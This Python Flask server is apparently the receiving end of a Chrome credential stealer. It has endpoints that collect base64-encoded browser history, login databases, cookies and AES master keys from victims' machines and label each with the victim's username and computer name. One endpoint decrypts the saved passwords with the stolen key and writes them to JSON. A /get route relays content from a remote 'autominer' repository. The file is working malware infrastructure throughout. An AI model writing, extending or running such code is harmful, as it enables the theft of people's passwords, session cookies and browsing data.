import flask
import time
import json
import base64
import sqlite3,requests
import win32crypt  # type: ignore
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from flask import request
app = flask.Flask(__name__)


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        return str(e)


def decrypt(filename, key):
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    data = []
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        if user_name or decrypted_password:
            data.append([main_url, login_page_url,
                        user_name, decrypted_password])
        else:
            continue
    cursor.close()
    db.close()
    return data


@app.route('/saveHistory', methods=['POST'])
def saveHistory():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "./history/history" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open(filename, "wb") as f:
            f.write(txt)
        con = sqlite3.connect(filename)
        cur = con.cursor()
        cur = cur.execute("SELECT * FROM 'urls'")
        # save as json
        with open(filename+".json", "w") as f:
            json.dump(cur.fetchall(), f)
        cur.close()
        con.close()
        return "ok"


@app.route('/saveLoginData', methods=['POST'])
def saveLoginData():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "./LoginData/LoginData" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open(filename, "wb") as f:
            f.write(txt)
        # print(txt)
        return "ok"


@app.route('/saveCookie', methods=['POST'])
def saveCookie():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['text']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "./Cookie/Cookie" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open(filename, "wb") as f:
            f.write(txt)
        # print(txt)
        return "ok"

@app.route('/saveAesKey', methods=['POST'])
def saveAesKey():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        key = data['masterKey']
        username = data['username']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        filename = "./aesKey/aesKey" + \
            str(int(time.time()))+"-"+username+"-"+ComputerName
        with open(filename+".aeskey", "wb") as f:
            f.write(key)
        # print(txt)
        return "ok"

@app.route('/saveSavedPasswords', methods=['POST'])
def saveSavedPasswords():
    if request.method == 'POST':
        data = request.form  # a multidict containing POST data
        txt = data['db']
        key = data['masterKey']
        name = data['name']
        username = data['username']
        ComputerName = data['ComputerName']
        key = key.split("\n")[0]
        key = base64.b64decode(key)
        txt = txt.split("\n")[0]
        txt = base64.b64decode(txt)
        filename = "./LoginData/LoginData" + \
            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
        with open(filename, "wb") as f:
            f.write(txt)
        password = decrypt(filename, key)
        with open(filename+".json", "w") as f:
            json.dump(password, f)
        return "ok"
@app.route('/get')
def get():
    return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text

app.run(host='0.0.0.0', port="50000")
